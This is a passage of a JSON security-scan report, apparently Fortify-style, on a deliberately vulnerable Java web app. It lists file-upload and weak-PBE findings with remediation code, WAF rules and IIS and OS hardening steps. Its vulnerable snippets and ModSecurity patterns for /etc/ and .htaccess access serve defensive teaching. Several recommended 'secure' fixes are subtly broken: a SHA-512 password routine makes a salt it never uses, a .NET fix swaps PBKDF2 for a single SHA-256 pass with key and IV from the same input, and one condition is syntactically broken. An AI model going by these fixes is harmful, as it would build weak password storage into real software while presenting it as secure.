class=\"btn\">Upload Employee Detail</button></p>        \n</form>"}]}, {"file": "WebContent/WEB-INF/jspViews/uploadFile.jsp", "items": [{"id": "IN00377", "function": "null()", "line": "28", "snippet": "<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n    <label for=\"file\">File</label>\n    <input id=\"file\" type=\"file\" name=\"file\" />\n    <p><button type=\"submit\" class=\"btn\">Upload</button></p>        \n</form>"}]}], "remediation": {"remediation": {"@id": "R.0039", "@name": "Often Misused: File Upload", "@dateLastModified": "8/7/2020", "faqs": {"faq": {"question": "The business requirement include the user submitting files to the application. Is this a vulnerability?", "answer": "Uploading files to the system is not a vulnerability per se, but the content of those files, size, where and how those files are stored and processed are vectors to many possible vulnerabilities. Some examples are explained here: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "[HttpPost]\npublic ActionResult UploadFile(<em class=\"red\">HttpPostedFileBase file</em>)\n{\n    try\n    {\n            string _FileName = Path.GetFileName(file.FileName);\n            string _path = Path.Combine(Server.MapPath(&quot;~/UploadedFiles&quot;), _FileName);\n            file.SaveAs(_path);\n            TempData[&quot;UploadMessage&quot;] = &quot;File Uploaded Successfully!!&quot;;\n\n...\n        }\n        else\n        {\n...\n}", "nonvulncode": "[HttpPost]\npublic ActionResult UploadFile(HttpPostedFileBase file)\n{\n    try\n    {\n<em class=\"blue\">        if (file.ContentLength &gt; 0 && file.ContentLength &lt; 10000   (Path.GetExtension(file.FileName).ToLower() == &quot;.xml&quot; || Path.GetExtension(file.FileName).ToLower() == &quot;.zip&quot;))</em>\n        {\n           <em class=\"blue\"> char[] illegalcharacters = Path.GetInvalidFileNameChars(); //get all invalid characters\n            fileName = illegalcharacters.Aggregate(Path.GetFileName(file.FileName), (current, c) =&gt; current.Replace(c, '_'));\n</em>\n            string _path = Path.Combine(Server.MapPath(&quot;~/UploadedFiles&quot;), fileName);\n            file.SaveAs(_path);\n            TempData[&quot;UploadMessage&quot;] = &quot;File Uploaded Successfully!!&quot;;\n\n...\n            }\n        }\n        else\n        {\n...\n}", "comments": "This is not a direct security issue, but an entry point to a lot of exploits that can cause issues to the application. Fortify detects this vulnerability as awareness to be validated by the business owners, tech arch and developers. SAST tools will notify about this vulnerability on both controllers and viewer (aspx pages).\n\nOn the server, validate the file before processing. In production, its good to check if the file has a virus before processing it. All uploaded files should be scanned in production by an anti-virus before processed by the system. The application must be tested against an infected (EICAR) file and fail gracefully (IOException treatment due to antivirus blocking / file not found on server after uploading)\n\nPlease validate if the functionality is properly implemented and all checks are in place to avoid common mistakes.\nThe code needs to be protected against CWE ID 434: Unrestricted Upload of File with Dangerous Type.\n\n\nFor examples of checks and mitigation strategies that can be applied to the application scenario, see OWASP Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload", "impact": "business needs to validate any change in the files accepted to be uploaded.", "abstract": "Use of RegExp and extension check"}, {"@type": "JAVA/JSP", "vulncode": "@RequestMapping(value=&quot;fileupload.html&quot;, method=RequestMethod.POST)\n\tpublic ModelAndView processUpload(@RequestParam(&quot;file&quot;) CommonsMultipartFile file) throws IOException,MultipartException {\n\t\tModelAndView mv= new ModelAndView();\n\n\t\tif (!file.isEmpty()) {\n\t\t\tString name = file.getOriginalFilename();\n\t\t\tString extension = FilenameUtils.getExtension(file.getOriginalFilename());\n\t\t\tString rootPath = System.getProperty(&quot;catalina.home&quot;);\n\n\t\t\tif (&quot;txt&quot;.equals(extension)) {\n\t\t\t\ttry {\n\t\t\t\t\tbyte[] bytes = file.getBytes();\n\n\t\t\t\t\t// Creating the directory to store file\n\t\t\t\t\tFile dir = new File(rootPath + File.separator + &quot;tmpFiles&quot;);\n\t\t\t\t\tif (!dir.exists())\n\t\t\t\t\t\tdir.mkdirs();\n\t\t\t\t\t\n\t\t\t\t\t// Create the file on server\n\t\t\t\t\tFile serverFile = new File(dir.getAbsolutePath()+ File.separator + name);\n\t\t\t\t\tBufferedOutputStream stream = new \n<em class=\"red\">//File written without path manipulation check and without restricting access</em>\nBufferedOutputStream(new FileOutputStream(serverFile));\n\t\t\t\t\tstream.write(bytes);\n\t\t\t\t\tstream.close();\t\t\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\tmv.setViewName(&quot;uploadFile&quot;);\n\t\t\t\t\tmv.addObject(&quot;msg&quot;,&quot;You successfully uploaded file=&quot; + name);\t\t\t\t\t\n\n\t\t\t\t\treturn mv;\n\t\t\t\t} catch (Exception e) {\n\t\t\t\t\tmv.setViewName(&quot;uploadFile&quot;);\n\t\t\t\t\tmv.addObject(&quot;msg&quot;, &quot;You failed to upload &quot; + name + &quot; =&gt; &quot;);\n\t\t\t\t\treturn mv;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tmv.setViewName(&quot;uploadFile&quot;);\n\t\t\t\tmv.addObject(&quot;msg&quot;, &quot;Only text files can be uploaded&quot;);\n\t\t\t\treturn mv;\n\t\t\t}\n\t\t\t\n\t\t}\n\t\treturn mv;\n\t}", "nonvulncode": "&lt;bean id=&quot;multipartResolver&quot;  class=&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt;\n    \t<em class=\"blue\">&lt;property name=&quot;maxUploadSize&quot; value=&quot;1000&quot; /&gt;</em>\n    &lt;/bean&gt;\n\n\t<em class=\"blue\">@ExceptionHandler(MultipartException.class)</em>\n\t@RequestMapping(value=&quot;fileupload.html&quot;, method=RequestMethod.POST)\n\tpublic ModelAndView processUpload(@RequestParam(&quot;file&quot;) CommonsMultipartFile file) throws IOException,MultipartException {\n\t\tModelAndView mv= new ModelAndView();\n\n\t\tif (!file.isEmpty()) {\n\t\t\tString name = file.getOriginalFilename();\n\t\t\tString extension = FilenameUtils.getExtension(file.getOriginalFilename());\n\t\t\tString rootPath = System.getProperty(&quot;catalina.home&quot;);\n\n\t\t\tif (<em class=\"blue\">&quot;txt&quot;.equals(extension)</em>) {<em class=\"blue\">//extension check</em>\n\t\t\t\ttry {\n\t\t\t\t\tbyte[] bytes = file.getBytes();\n\n\t\t\t\t\t// Creating the directory to store file\n\t\t\t\t\tFile dir = new File(rootPath + File.separator + &quot;tmpFiles&quot;);\n\t\t\t\t\tif (!dir.exists())\n\t\t\t\t\t\tdir.mkdirs();\n\t\t\t\t\t\n\t\t\t\t\t// Create the file on server\n\t\t\t\t\tFile serverFile = new File(dir.getAbsolutePath()+ File.separator + name);\n\t\t\t\t\t\n\t\t\t\t\tif(<em class=\"blue\">serverFile.getCanonicalFile().getName().equals(name)</em>) {\n\t\t\t\t\t<em class=\"blue\">serverFile.setWritable(false); // This restricts user from overriding the file with same filename</em>\n\t\t\t\t\tBufferedOutputStream stream = new BufferedOutputStream(\n\t\t\t\t\t\t\tnew FileOutputStream(serverFile));\n\t\t\t\t\tstream.write(bytes);\n\t\t\t\t\tstream.close();\t\t\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\tmv.setViewName(&quot;uploadFile&quot;);\n\t\t\t\t\tmv.addObject(&quot;msg&quot;,&quot;You successfully uploaded file=&quot; + name);\n\t\t\t\t\t} <em class=\"blue\">else {\n\t\t\t\t\t\tmv.setViewName(&quot;uploadFile&quot;);\n\t\t\t\t\t\tmv.addObject(&quot;msg&quot;,&quot;You failed to upload file, since the file name tried to manipulate path&quot;);\n\t\t\t\t\t}\n</em>\n\t\t\t\t\treturn mv;\n\t\t\t\t} catch (Exception e) {\n\t\t\t\t\tmv.setViewName(&quot;uploadFile&quot;);\n\t\t\t\t\tmv.addObject(&quot;msg&quot;, &quot;You failed to upload &quot; + name + &quot; =&gt; &quot;);\n\t\t\t\t\treturn mv;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tmv.setViewName(&quot;uploadFile&quot;);\n\t\t\t\tmv.addObject(&quot;msg&quot;, &quot;Only text files can be uploaded&quot;);\n\t\t\t\treturn mv;\n\t\t\t}\n\t\t\t\n\t\t}\n\t\treturn mv;\n\t}", "comments": "When implementing a file uplaod method, validate the extenstion, maxsize , file restrictions , path etc before uploading file to server.\n\nOn the server, validate the file before processing. In production, its good to check if the file has a virus before processing it. All uploaded files should be scanned in production by an anti-virus before processed by the system. Tha application must be tested against an infected (EICAR) file and fail gracefully (IOException treatment due to antivirus blocking / file not found on server after uploading)\n\nThe code needs to be protected against CWE ID 434: Unrestricted Upload of File with Dangerous Type\n\nFor more examples of checks and mitigation strategies that can be applied, see OWASP Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload", "impact": "business needs to validate any change in the files accepted to be uploaded.", "abstract": "Use of canonical path and extension check to ensure proper file upload"}]}, "mitigations": {"mitigation": [{"system": "WAF / ModSecurity", "configuration": "web.config\nInsert the below code, right after the &lt;/configSections&gt; in the web.config file of the web application.\n\n&lt;system.webServer&gt;\n    &lt;ModSecurity enabled=&quot;true&quot; configFile=&quot;C:\\Program Files\\ModSecurity IIS\\modsecurity_iis.conf&quot; /&gt;\n&lt;/system.webServer&gt;\n\nThe value of the configFile must be the path on where the ModSecurity installed.", "backend": "- OWASP CRS must be downloaded and enabled. \n- Rules for Remote File Inclusion attack (must be present in the rules folder)\n   - REQUEST-931-APPLICATION-ATTACK-RFI.conf \n- \n   - CRS_40_Generic_attack\n - Open the modsecurity.conf and update the SecRuleEngine to On.\n- Open the modsecurity_iis.conf and update the entry Include crs-setup.conf.example to Include crs-setup.conf\nMake sure the below rules are enabled: \n# File Injection\n#\nSecRule REQUEST_COOKIES|!REQUEST_COOKIES:/_(_utm|pk_ref)/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* &quot;(?:\\b(?:\\.(?:ht(?:access|passwd|group)|www_?acl)|global\\.asa|httpd\\.conf|boot\\.ini)\\b|\\/etc\\/)&quot; \\\n\t&quot;phase:2,rev:'3',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'9',capture,t:none,t:cmdLine,ctl:auditLogParts=+E,block,msg:'Remote File Access Attempt',id:'950005',tag:'OWASP_CRS/WEB_ATTACK/FILE_INJECTION',tag:'WASCTC/WASC-33',tag:'OWASP_TOP_10/A4',tag:'PCI/6.5.4',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',severity:'2',setvar:'tx.msg=%{rule.msg}',setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/FILE_INJECTION-%{matched_var_name}=%{tx.0}&quot;\nSecMarker END_FILE_INJECTION\n\n# Block file uploads and access of files named .htaccess or .htpasswd\n#\n# http://resources.infosecinstitute.com/file-upload-vulnerabilities/\n# http://pwnsrc.blogspot.com/2012/12/php-htaccess-backdoors.html\n#\n# Attackers may use such a vulnerability to achieve remote code execution\n# by uploading a .htaccess files. If the htaccess file can be changed it \n# is possible to circumvent protection mechanisms and allow an attacker \n# the ability to upload a malicious file that can result in arbitrary\n# code execution.\n#\n# If the .htpasswd file is modified by an attacker it may allow them \n# access to areas that are meant to be protected by authentication\n#\n# Some AJAX uploaders use the nonstandard request headers X-Filename,\n# X_Filename, or X-File-Name to transmit the file name to the server;\n# scan these request headers as well as multipart/form-data file names.\n#\nSecRule FILES|REQUEST_HEADERS:X-Filename|REQUEST_HEADERS:X_Filename|REQUEST_HEADERS:X-File-Name|REQUEST_FILENAME &quot;@rx .(?:htaccess|htpasswd)&quot; \\\n        &quot;msg:'Attempt to upload or access .htaccess or .htpasswd file detected',\\\n        phase:request,\\\n        ver:'OWASP_CRS/3.0.0',\\\n        maturity:'1',\\\n        accuracy:'8',\\\n        t:none,t:lowercase,\\\n        ctl:auditLogParts=+E,\\\n        block,\\\n        capture,\\\n        logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n        id:'933110',\\\n        severity:'CRITICAL',\\\n        tag:'application-multi',\\\n        tag:'language-multi',\\\n        tag:'platform-Apache',\\\n        tag:'attack-remote code execution',\\\n        tag:'OWASP_CRS/WEB_ATTACK/PHP_INJECTION',\\\n        tag:'OWASP_TOP_10/A1',\\\n        setvar:'tx.msg=%{rule.msg}',\\\n        setvar:tx.php_injection_score=+%{tx.critical_anomaly_score},\\\n        setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},\\\n        setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/RCE-%{matched_var_name}=%{tx.0}&quot;", "frontend": "Ex1.\nSecRule FILES|REQUEST_HEADERS:X-Filename|REQUEST_HEADERS:X_Filename|REQUEST_HEADERS:X-File-Name|REQUEST_FILENAME &quot;@rx .(?:htaccess|htpasswd)&quot; \\\n        &quot;msg:'Attempt to upload or access .htaccess or .htpasswd file detected',\\\n        phase:request,\\\n        ver:'OWASP_CRS/3.0.0',\\\n        maturity:'1',\\\n        accuracy:'8',\\\n        t:none,t:lowercase,\\\n        ctl:auditLogParts=+E,\\\n        block,\\\n        capture,\\\n        logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n        id:'933110',\\\n        severity:'CRITICAL',\\\n        tag:'application-multi',\\\n        tag:'language-multi',\\\n        tag:'platform-Apache',\\\n        tag:'attack-remote code execution',\\\n        tag:'OWASP_CRS/WEB_ATTACK/PHP_INJECTION',\\\n        tag:'OWASP_TOP_10/A1',\\\n        setvar:'tx.msg=%{rule.msg}',\\\n        setvar:tx.php_injection_score=+%{tx.critical_anomaly_score},\\\n        setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},\\\n        setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/RCE-%{matched_var_name}=%{tx.0}&quot;\n\nEx2.\n\t# Enable request processing\n\tSecRuleEngine On\n\t# enable inspection of request bodies\n\tSecRequestBodyAccess On\n\t# set actual request size limit\n\tSecRequestBodyLimit 3000000\n\t# actually generate an HTTP error, instead of truncating\n\tSecRequestBodyLimitAction Reject\n\t# Avoid big request bodies that do not try to upload files\n\tSecRequestBodyNoFilesLimit 1048576\n\t# tune memory usage\n\tSecRequestBodyInMemoryLimit 131072", "comments": "WAF technologies with default ruleset does not protect against this vulnerability. \n\nIf needed, new custom rules can be created to allow only specific file types, and this depends on the specific business requirements.\n\n\n\nReference :\nhttps://github.com/coreruleset/coreruleset/issues/363 \nhttps://github.com/SpiderLabs/owasp-modsecurity-crs/issues/363\nhttps://serverfault.com/questions/591701/how-to-limit-size-of-uploaded-file-with-limitrequestbody-and-proxypass\nhttps://www.feistyduck.com/library/modsecurity-handbook-2ed-free/online/ch03-configuration.html"}, {"system": "Web Server / IIS", "configuration": "IIS Manager interface", "backend": "Reques Filtering(IIS Manager interface) :\n\n1.Open IIS Manager and select the level for which you want to configure request filter.\n2.In Features View, double-click Request Filtering.\n3.Select the Rules tab.\n4.In the Actions pane, double-click Add Filtering Rule.\n5.In the Name box, type a name for the filtering rule.\n\nFile Name Extention(IIS Manager interface) :\n1. Open IIS Manager and select the level for which you want to configure request filter.\n2. In Features View, double-click Request Filtering.\n3. Select the File Name Extensions tab.\n4. In the Actions pane, click either Allow File Name Extension or Deny File Name Extension.\n5. Type the file name extension in the box, and then click OK\n\nvia cmd: \nappcmd set config /section:requestfiltering /+fileExtensions.[fileextension='string',allowed='true | false']\n\nConfigure the maximum allowed content length:\nappcmd set config /section:requestfiltering /requestlimits.maxallowedcontentlength:unit\n\nEx1.\nappcmd set config /section:requestfiltering /requestlimits.maxallowedcontentlength:30000000\n\nConfigure the maximum allowed query string length:\nappcmd set config /section:requestfiltering /requestlimits.maxquerystring:unit\n\nEx1.appcmd set config /section:requestfiltering /requestlimits.maxquerystring:2048", "frontend": "Web.config: It's a good idea to disable the MIME types that are not  being used by the application. You can find the list by checking the IIS and the MIME types.  \nFor the MIME types that are used by the application , exclude them from the list. \nRfernece: https://www.sitepoint.com/mime-types-complete-list/\n\n&lt;system.webServer&gt;\n    &lt;security&gt;\n        &lt;requestFiltering&gt;\n            &lt;fileExtensions&gt;\n                &lt;add fileExtension=&quot;.aspx&quot; allowed=&quot;false&quot; /&gt;\n                &lt;add fileExtension=&quot;.php&quot; allowed=&quot;false&quot; /&gt;\n                &lt;add fileExtension=&quot;.asp&quot; allowed=&quot;false&quot; /&gt;\n            &lt;/fileExtensions&gt;\n        &lt;/requestFiltering&gt;\n    &lt;/security&gt;\n&lt;/system.webServer&gt;", "comments": "Request filters restrict the types of HTTP requests that IIS  processes. By blocking specific HTTP requests, request filters help prevent potentially harmful requests from reaching the server. The request filter module scans incoming requests and rejects requests that are unwanted based upon the rules that you set up.\n\nThis can be customised to prevent/ blacklist specific filetypes or file size etc.\n\n\nRefernce : \nhttps://docs.microsoft.com/en-us/iis/manage/configuring-security/configure-request-filtering-in-iis\nhttps://webmasters.stackexchange.com/questions/28733/prevent-iis-from-executing-scripts-in-a-specific-directory"}, {"system": "Web Server / IIS", "configuration": "IIS Manager interface", "backend": "1. Open the Internet Information Services (IIS) manager.\n2. Navigate to and click the upload folder for the relevant website, and then under the IIS section, double-click Handler Mappings.\n3. In the Actions pane, click Edit Feature Permissions.\n4. In the Edit Feature Permissions dialog box, clear the Script and Execute check boxes and click OK.", "frontend": "&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;configuration&gt;\n    &lt;system.webServer&gt;\n        &lt;handlers&gt;\n            &lt;clear /&gt;\n            &lt;add name=&quot;StaticFile&quot; path=&quot;*&quot; verb=&quot;*&quot; modules=&quot;StaticFileModule,DefaultDocumentModule,DirectoryListingModule&quot; resourceType=&quot;Either&quot; requireAccess=&quot;Read&quot; /&gt;\n        &lt;/handlers&gt;\n    &lt;/system.webServer&gt;\n&lt;/configuration&gt;", "comments": "If the Admin allow users to modify the content of the upload folder, the Admin  also give them the permissions to place scripts and executable programs in the folder. Executing these scripts and programs can cause an unexpected behavior on the server.\n\nTo avoid this,the Admin can deny permissions to run scripts and executable files in the upload folder and thereby prevent an uploaded file from being executed on the server side when a user attempts to download it.\n\nNote\nthe Admin  only need to perform this step if  configuration allows content authors to place files directly in the upload folder. For example, if the Admin  use a shared directory or FTP server, content authors can quickly place a lot of media in the media library.\n\nReference: \nhttps://doc.sitecore.com/developers/81/sitecore-experience-platform/en/secure-the-file-upload-functionality.html#UUID-0e8aecb3-d098-03b4-bea8-893650fa8a1c_id__Deny_execute_permissions\nhttps://serverfault.com/questions/672483/iis-block-execution-of-files-in-directory"}, {"system": "OS Hardening", "configuration": "[Unix]\nuse chroot to jail the application to the appropriated folders\nUse permissions on files/folders not to be accessed by users.\n\n[Windows (any version)]\nuse SUBST to limit the user access to one drive letter associated with the folder.\nsubst f: c:\\code\\tmp\n\nUse icacls  command to manage access of user to a specific directory\nicacls directory [/substitute SidOld SidNew [...]] /restore aclfile [/C] \n       [/L] [/Q]", "backend": "Unix/Linux(chroot ):\n\nchroot /path/to/new/root command\nor\nchroot /path/to/new/root /path/to/server\nor\nchroot [options] /path/to/new/root /path/to/server\n\nWindows (SUBST / icals ):\n\nsubst z: b:\\user\\betty\\forms\n\nicacls test1 /grant User1:(d,wdac)", "frontend": "see backend code section", "comments": "chroot command in Linux/Unix system is used to change the root directory. Every process/command in Linux/Unix like systems has a current working directory called root directory. It changes the root directory for currently running processes as well as its child processes.\n\nAs part of the OS / Container hardening, it is a good practice to restrict the files the application can access, and limit any access outside the application scope.\nmake sure the application can only write files on a restricted folder structure.\n\nUploaded files must be set to not executable, read only, during creation time (business requirements dependent). \n\nReference:\nhttps://www.geeksforgeeks.org/chroot-command-in-linux-with-examples/#:~:text=chroot%20command%20in%20Linux%2FUnix,well%20as%20its%20child%20processes.\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/subst\nhttps://www.computerhope.com/icacls.htm\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls"}, {"system": "Antivirus", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "To minimize risk, all files should be scanned for malware. We recommend multi-scanning files with multiple anti-malware engines (using a combination of signatures, heuristics, and machine learning detection methods) in order to get the highest detection rate and the shortest window of exposure to malware outbreaks.\n\nScan all files uploaded by users (during write and during read operations) before processing those files by the system. \n\nThe folder used to upload files cannot be part of the A/V folder exceptions (folders not scanned).\n\nApplication must be tested against an infected file and fail gracefully (IOException treatment due to antivirus blocking / file not found on server after uploading)\n\nYou can do a The EICAR test  for testing the antivirus for malicious  signature and file upload.\n\nReference :\nhttp://www.exploresecurity.com/testing-for-anti-virus-on-file-upload/"}]}}}}, "Weak Cryptographic Hash: Insecure PBE Iteration Count": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00402", "function": "PBEParameterSpec()", "line": "401", "snippet": "//ecipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(new byte[16]));\n            ecipher.init(Cipher.DECRYPT_MODE, key, new PBEParameterSpec(new byte[16], 50));\n            byte[] decrptByte=ecipher.doFinal(Base64.getDecoder().decode(encrypted));            \n            String decrypted = new String(decrptByte);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00403", "function": "PBEKeySpec()", "line": "429", "snippet": "Cipher cipherDec = Cipher.getInstance(\"PBEWithMD5AndDES\");\n\t\t\tPBEKeySpec pbe = new PBEKeySpec(passphrase);\n\t\t\t \n\t\t\tKey skey = keyFactory.generateSecret(pbe);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00404", "function": "PBEParameterSpec()", "line": "432", "snippet": "Key skey = keyFactory.generateSecret(pbe);\n\t\t\tcipherDec.init(Cipher.ENCRYPT_MODE, skey, new PBEParameterSpec(new byte[8], 50));\n\t\t\tbyte[] enc = cipherDec.doFinal(password.getBytes());       \n            encrypted = Base64.getEncoder().encodeToString(enc);"}]}], "remediation": {"remediation": {"@id": "R.0026", "@name": "Weak Cryptographic Hash: Insecure PBE Iteration Count", "@dateLastModified": "2/3/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public static string EncryptString(string encryptString, string encryptionKey)\n        {\n            byte[] clearBytes = Encoding.Unicode.GetBytes(encryptString);\n\n            MemoryStream mStream = new MemoryStream();\n\n            using (Aes AESalg = Aes.Create())\n            {\n                byte[] salt = Encoding.ASCII.GetBytes(ConfigurationManager.AppSettings[&quot;salt&quot;].ToString());\n\n                Rfc2898DeriveBytes key = new <em class=\"red\">Rfc2898DeriveBytes(encryptionKey, salt)</em>;\n                AESalg.Key = key.GetBytes(AESalg.KeySize / 8);\n                AESalg.IV = key.GetBytes(AESalg.BlockSize / 8);\n     \n                ICryptoTransform encryptor = AESalg.CreateEncryptor(AESalg.Key, AESalg.IV);\n                using (MemoryStream ms = new MemoryStream())\n                {\n                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))\n                    {\n                        cs.Write(clearBytes, 0, clearBytes.Length);\n                        cs.Close();\n                    }\n                    encryptString = Convert.ToBase64String(ms.ToArray());\n                }\n            }\n            return encryptString;\n        }", "nonvulncode": "private string EncryptString(string encryptString, string encryptionKey)\n        {\n            byte[] clearBytes = Encoding.Unicode.GetBytes(encryptString);\n            MemoryStream mStream = new MemoryStream();\n            using (Aes AESalg = Aes.Create())\n            {\n                byte[][] keys = <em class=\"blue\">GetHashKeys(encryptionKey);</em> //Method is using SHA256 Hash\n                AESalg.Key = keys[0];\n                AESalg.IV = keys[1];\n                ICryptoTransform encryptor = AESalg.CreateEncryptor(AESalg.Key, AESalg.IV);\n                using (MemoryStream ms = new MemoryStream())\n                {\n                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))\n                    {\n                        cs.Write(clearBytes, 0, clearBytes.Length);\n                        cs.Close();\n                    }\n                    encryptString = Convert.ToBase64String(ms.ToArray());\n                }\n            }\n            return encryptString;\n        }\n private byte[][] GetHashKeys(string encryptionKey)\n        {\n            byte[][] result = new byte[2][];\n          <em class=\"blue\">  using (SHA256 sha2 = new SHA256CryptoServiceProvider())</em>\n            {\n                Encoding enc = Encoding.UTF8;\n                byte[] rawKey = enc.GetBytes(encryptionKey);\n                byte[] rawIV = enc.GetBytes(encryptionKey);\n\n                byte[] hashKey = sha2.ComputeHash(rawKey);\n                byte[] hashIV = sha2.ComputeHash(rawIV);\n                \n                Array.Resize(ref hashKey, 32);\n                Array.Resize(ref hashIV, 16);\n\n                result[0] = hashKey;\n                result[1] = hashIV;\n            }\n            return result;\n        }", "comments": "This vulnerability is composed by 2 different errors:\n1) Rfc2898DeriveBytes has a 1,000 default iteration if you don't specify it in the code. The ideal iteration is 100,000 or greater. NIST SP 800-132 recommends using an iteration count of as high as 10,000,000 for critical keys or very powerful systems. \nFortify will always detect this as an issue if the iteration is less than 100,000, any less than 1,000 will fortify will report as severe issue and low for 1,000 and above.\n\n2) Rfc2898DeriveBytes class is based on HMACSHA1.  SHA1 is considered weak and should be avoided on using it within security-critical contexts.\n\nRecommended Hashing algorithm that are available in .Net are SHA256, SHA384 and SHA512.\nReference: https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rfc2898derivebytes?view=netcore-3.1\n\nThe recommendation is to change the algorithm instead of changing the iterations of Rfc2898DeriveBytes.\n\nResize the byte length of the computed hash return by the hashing algorithm to avoid error because the length of the Key property of the AES encryption algorithm will not accept more than 32 bytes and 16 bytes for the IV property.\n\nFor example:\n               byte[] rawKey = sha2.ComputeHash(passwordWithSaltBytes.ToArray());\n                byte[] rawIV = sha2.ComputeHash(passwordWithSaltBytes.ToArray());\n\nSHA256 -&gt;   this will return 32 byte array\nSHA384 -&gt; this will return 48 byte array\nSHA512 -&gt; this will return 64 byte array\n\nResize example:\n              Array.Resize(ref hashKey, 32);\n                Array.Resize(ref hashIV, 16);\n\nCryptographic modules must be compliant with NIST guidance. When cryptography in use, must be in compliance with all applicable laws, regulations, standards, and guidance.\nPassword should be stored in encrypted format.\n\nRegulations (e.g.: https://www.irs.gov/pub/irs-pdf/p1075.pdf ; )", "impact": "There's no difference on the performance execution if you use any of the following SHA256, SHA384 and SHA512 hashing algorithm.\n\nIf changing the algorithm is not possible, the recommendation is to increase the iterations for SHA1. The increase in number of iteration will increase the time to process the key. If the application will perform this operation for many users in concurrency, it may slow down the application. Usually this is not the case as the application typically perform this operation only a few times, when encrypting new data. See reference: https://github.com/dotnet/runtime/issues/24897 \n\nChanging to another hashing algorithm it has an impact on the existing data which may cause problem on the data flow. Example given - password hashing will not authenticate, when change algorithm we recommend to run it in parallel and update all legacy data to the new algorithm e.g. Check password with new algorithm, if it fails check password with old algorithm and if passes ask the user to change the password.", "abstract": "Use of SHA256 algorithm"}, {"@type": "JAVA/JSP", "vulncode": "private String encryptWithPBEDES(String password) {\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\tchar[] passphrase = password.toCharArray();\n\t\t\tSecretKeyFactory keyFactory = SecretKeyFactory.getInstance(&quot;PBEWithMD5AndDES&quot;);\n\t\t\n\t\t\tCipher cipherDec = Cipher.getInstance(&quot;PBEWithMD5AndDES&quot;);\n\t\t\tPBEKeySpec pbe = new PBEKeySpec(passphrase);\n\t\t\t \n\t\t\tKey skey = keyFactory.generateSecret(pbe);\n\t\t\tcipherDec.init(Cipher.ENCRYPT_MODE, skey, <em class=\"red\">new PBEParameterSpec(new byte[8], 50));</em>\n\t\t\tbyte[] enc = cipherDec.doFinal(password.getBytes());       \n            encrypted = Base64.getEncoder().encodeToString(enc);\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;Error during PBE encryption&quot;, e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;Error during PBE encryption&quot;, e.getMessage());\n\t\t} catch (InvalidKeySpecException e) {\n\t\t\tlogger.error(&quot;Error during PBE encryption&quot;, e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;Error during PBE encryption&quot;, e.getMessage());\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\tlogger.error(&quot;Error during PBE encryption&quot;, e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;Error during PBE encryption&quot;, e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;Error during PBE encryption&quot;, e.getMessage());\n\t\t}\n\t\t \n\t\t  return encrypted;\n\t}\npublic ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean)\n\t{\n....\n<em class=\"red\">encryptAES(userAccountBean.password);\n....\n}</em>", "nonvulncode": "private String encryptWithSHA(String pwd) {\n\t\tString encryptedText = null;\n\t\t\n\t\tSecureRandom sr;\n\t\ttry {\n\t\t\tsr = SecureRandom.getInstance(&quot;SHA1PRNG&quot;);\n\t\t\tbyte[] salt = new byte[16];\n\t        sr.nextBytes(salt);\n\t        \t        \n\t        MessageDigest md = MessageDigest.getInst<em class=\"blue\">ance(&quot;SHA-512&quot;);</em>\n            md.update(pwd.getBytes());\n            byte[] bytes = md.digest();\n            StringBuilder sb = new StringBuilder();\n            for(int i=0; i&lt; bytes.length ;i++)\n            {\n                sb.append(Integer.toString((bytes[i] & 0xff) + 0x100, 16).substring(1));\n            }\n            encryptedText = sb.toString();\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;Error during SHA hashing&quot;);\n\t\t}\n\t\treturn encryptedText;\n\t}\npublic ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean)\n\t{\n....\n<em class=\"blue\">encryptWithSHA(userAccountBean.password);</em>\n....\n}", "comments": "It is 